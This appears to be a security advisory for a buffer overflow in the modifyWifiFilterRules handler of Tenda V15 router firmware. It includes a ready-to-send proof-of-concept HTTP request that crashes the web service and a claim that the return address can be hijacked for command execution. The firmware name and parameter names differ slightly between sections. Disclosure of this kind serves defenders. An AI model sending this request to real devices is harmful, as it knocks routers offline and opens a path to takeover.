## Tenda V15V1.0 found a buffer overflow vulnerability in the "modifyWifiFilterRules" function

### Vendor:

​	Tenda

### Product:

​	V15EV1.0

### Vendor Homepage:

​	https://www.tenda.com.cn/

### Firmware:

​	https://www.tenda.com.cn/download/detail-2722.html

### Version:

​	V15.11.0.14(1521_3190_1058)

## Vulnerability details

The vulnerability is in the `"formWifiFilterRulesModify -> modifyWifiFilterRules"` function in the `/bin/httpd` file

​	![image](https://user-images.githubusercontent.com/76503635/219951640-c4eb4d9f-bdfc-4188-9138-187c90876a79.png)
​ ![image](https://user-images.githubusercontent.com/76503635/219951680-0cd309d7-09ba-40ea-904a-ceba00d25f9a.png)


`"pRuleMac","pRuleDesc"` receives the transmitted parameters, does not verify its length. causes a buffer overflow vulnerability due to the use of `sprintf()`

## POC

```http
POST /goform/modifyWifiFilterRules HTTP/1.1
Host: 192.168.75.201
Content-Length: 250
Accept: */*
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.75.201
Referer: http://192.168.75.201/quickset/quickset.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,en-US;q=0.7,en;q=0.6
Cookie: W15E_user=
Connection: close

wifiFilterListRemark=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```

Start httpd using qemu

![image](https://user-images.githubusercontent.com/76503635/219951940-c1961443-8b6f-4856-8dbc-6b0ac47a3adc.png)

![image](https://user-images.githubusercontent.com/76503635/219951982-f171c4be-7be5-45d9-bd87-4246da97a130.png)

DOS caused by sending request

![image](https://user-images.githubusercontent.com/76503635/219952040-cb186d4c-3781-4f3f-9b49-e16fc7fdec1c.png)

And overwrite the return address, an execute arbitrary commands by constructing EXP
